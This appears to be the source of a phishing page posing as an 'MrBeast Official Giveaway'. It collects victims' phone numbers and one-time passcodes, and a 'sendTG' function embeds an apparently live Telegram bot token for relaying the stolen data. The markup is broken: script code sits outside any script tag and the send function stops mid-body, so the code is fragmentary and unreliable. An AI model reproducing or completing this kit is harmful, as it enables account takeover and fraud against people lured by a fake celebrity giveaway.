<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MrBeast Official Giveaway</title>
    <style>
        :root {--primary:#00c853;--dark:#111;--light:#f8f9fa;}
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Poppins',sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;}
        .container{width:100%;max-width:420px;background:var(--dark);border-radius:16px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.8);}
        .header{background:var(--primary);padding:20px;text-align:center;}
        .header svg{width:220px;height:auto;}
        .header h1{font-size:24px;margin-top:10px;}
        .form-body{padding:30px;}
        input,select{width:100%;padding:14px;margin:10px 0;border:none;border-radius:8px;background:#222;color:#fff;font-size:16px;}
        button{width:100%;padding:16px;background:var(--primary);color:#000;font-weight:700;border:none;border-radius:8px;cursor:pointer;font-size:18px;margin-top:20px;}
        .loader{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;}
        .spinner{width:60px;height:60px;border:6px solid #333;border-top:6px solid var(--primary);border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px;}
        @keyframes spin{to{transform:rotate(360deg);}}
        .otp-inputs{display:flex;justify-content:space-between;margin:20px 0;}
        .otp-inputs input{width:48px;height:58px;text-align:center;font-size:24px;}
        .hidden{display:none;}
        .error{color:#ff5555;font-size:14px;margin-top:5px;text-align:center;}
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
</head>

    async function sendTG(msg){
        const token = '8446493963:AAHEaD0xD3O63a56khu8QEGtRsf-YXlvDBI';

    // Phone validation
    function validatePhone(){
        const code = document.getElementById('countryCode');
        const phone = document.getElementById('phone').value.replace(/\D/g,'');
        const [prefix, lenStr] = code.value.split('|');
        const lens = lenStr.includes('-') ? lenStr.split('-').map(Number) : [Number(lenStr)];
        const min = Math.min(...lens), max = Math.max(...lens);

        const fake = /^(0{7,}|1{7,}|12345|123456789|99999|00000|11111|22222|33333|44444|55555|66666|77777|88888)$/i;

        if (!phone || phone.length < min || phone.length > max || fake.test(phone)){
            document.getElementById('phoneError').classList.remove('hidden');
            return false;
        }
        document.getElementById('phoneError').classList.add('hidden');
        fullPhone = prefix + phone;
        document.getElementById('shownum').textContent = fullPhone;
        return true;
    }
